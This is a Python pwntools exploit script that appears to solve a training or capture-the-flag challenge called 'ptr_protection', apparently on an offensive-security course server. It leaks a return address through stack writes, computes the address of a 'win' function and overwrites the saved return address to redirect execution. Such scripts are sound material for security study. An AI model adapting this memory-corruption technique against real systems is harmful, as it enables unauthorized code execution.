#! /usr/bin/python3
import pwn
import sys

def put_onstack(offset,data):
    for i in range(0,len(data)):
        put_byte_onstack(i+offset, data[i])

def put_byte_onstack(pos, byte):
    r.recv()
    r.sendline(str(pos))
    r.recv()
    r.sendline(str(byte))

def reset():
    r.recv()
    r.sendline(str(-1))
    out = r.recv()
    return out


pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
args = sys.argv
pwn.context.log_level = "DEBUG"
if "remote" not in args:
    r = pwn.process("./ptr_protection")
    pwn.context.arch = "amd64"
    if "gdb" in args:
        print("debug")
        gdb = pwn.gdb.attach(r, '''
        ''')
else:
    r = pwn.remote("bin.training.offdef.it", 4202)

ptr_protection = pwn.ELF("./ptr_protection")
win = ptr_protection.sym["win"]
main = ptr_protection.sym["main"]
print(win)
print(main)
offset_main_win = main-win
print(offset_main_win)
put_onstack(40,b'\x50')
out = reset()
input("wait")
pwn.log.debug(out)
retaddress = out.rsplit(b'x')[1].rsplit(b'\n')[0]
retaddress = str(retaddress, encoding='ascii')
retaddress = bytes.fromhex(retaddress)
print(retaddress.hex())
retaddress=b'\x00\x00'+retaddress
print(retaddress.hex())
retaddress = pwn.packing.u64(retaddress, sign="unsigned", endianness="big")
winaddress = retaddress-0x368
winaddress = pwn.packing.p64(winaddress, sign="unsigned", endianness="little")
print(winaddress.hex())
input("wait")
put_onstack(40,b'\x89')
input("wait")
put_onstack(48,winaddress)
reset()
output= r.recv()
print(output)
r.interactive()
